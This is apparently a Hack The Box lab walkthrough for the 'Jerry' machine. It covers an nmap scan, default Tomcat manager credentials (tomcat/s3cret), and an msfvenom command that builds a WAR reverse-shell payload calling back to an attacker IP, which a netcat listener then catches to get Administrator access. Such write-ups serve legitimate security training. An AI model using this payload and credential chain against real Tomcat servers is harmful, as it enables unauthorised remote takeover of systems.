
# Machine Info




# Walkthrough

1. Nmap scan result in the found of Tomcat service Website running in 8080 port.
	- ┌─[ghoth@parrot]─[~/HTB/machines/jerry]
		└──╼ $cat serviceScan.nmap 
		# Nmap 7.94SVN scan initiated Sat Jan 11 00:40:06 2025 as: nmap -sC -sV -p- -Pn --min-rate 5000 -oA serviceScan 10.10.10.95
		Nmap scan report for 10.10.10.95 (10.10.10.95)
		Host is up (0.22s latency).
		Not shown: 65534 filtered tcp ports (no-response)
		PORT     STATE SERVICE VERSION
		8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
		|_http-title: Apache Tomcat/7.0.88
		|_http-favicon: Apache Tomcat
		|_http-server-header: Apache-Coyote/1.1
		
		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		# Nmap done at Sat Jan 11 00:41:00 2025 -- 1 IP address (1 host up) scanned in 53.90 seconds


2. Home page of the website:
	1. ![[Pasted image 20250221153014.png]]
	
3. When visiting the manager app, It ask for credential. Cancelling the login revel the credential:
	1. Username -> tomcat
	2. Password -> s3cret
	3. ![[../Pasted image 20250225221356.png]]

4. Landing page after loggin in:
	   ![[Pasted image 20250221171429.png]]

5. The page seem to be allowing the user to upload .war file. 
	1. ![[Pasted image 20250221171547.png]]

6. Then i generate a msfvenom .war file paylaod for reverse shell. and named it payload.war.
	- ┌─[✗]─[ghoth@parrot]─[~/HTB/machines/jerry]
		└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=8888 -f war -o payload.war
		Payload size: 1096 bytes
		Final size of war file: 1096 bytes
		Saved as: payload.war

7. The uploaded file seem to be appear in the main page table, where we can click and run.
	1. ![[Pasted image 20250221171827.png]]

8. Before executing the payload, I had already started my netcat server listening in the port 8888. And we got the connection after executing the payload. 
	![[Pasted image 20250221165413.png]]

9. The shell we got seem to have administrator authority (High authority).
	![[Pasted image 20250221165700.png]]

10. Then we found the flag in the flag directory in desktop of Administrator user.  
	

	![[Pasted image 20250221171038.png]]
	


